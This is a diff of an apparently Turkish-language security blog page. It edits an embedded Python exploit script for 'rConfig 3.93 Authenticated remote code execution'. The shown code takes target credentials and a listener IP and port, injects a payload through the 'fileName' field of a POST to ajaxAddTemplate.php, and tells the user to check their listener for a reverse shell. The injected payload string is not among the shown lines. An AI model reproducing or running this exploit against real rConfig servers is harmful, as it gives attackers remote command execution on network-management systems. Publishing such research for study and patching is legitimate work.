@@ -110,16 +110,16 @@ Uygulama varsayılan olarak centOS üzerinde çalışıyor bu sebeple PANDORAFMS
 
     <div class="highlight"><pre><span></span>
 '''
-rConfig 3.93 Authenticated RCE
+rConfig 3.93 Authenticated remote code execution.
 Author: Engin Demirbilek
-Author blog: engindemirbilek.github.io
-
+Author Blog: engindemirbilek.github.io
 '''
+
 import requests
 import sys
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 if len(sys.argv) < 6:
 	print "Usage: ./exploit.py http(s)://url username password listenerIP listenerPort"
 	exit()
@@ -142,6 +142,8 @@ payload = {
 	'fileName':payload,
 }
 
+
+
 print "[+] Sendin exploit ..."
 
 exploit = req.post(url+"/lib/ajaxHandlers/ajaxAddTemplate.php",cookies=req.cookies, data=payload, headers={
@@ -153,7 +155,8 @@ exploit = req.post(url+"/lib/ajaxHandlers/ajaxAddTemplate.php",cookies=req.cooki
 if exploit.status_code == 200:
 	print "[+] Everything seems ok, check your listener."
 else:
-	print "[-] Exploit failed, check your credentials or may the system is patched."
+	print "[-] Exploit failed,  system is patched or credentials are wrong."
+
 </pre></div><br>
 
 <video id="rConfig exploitation" class="video-js vjs-default-skin" controls
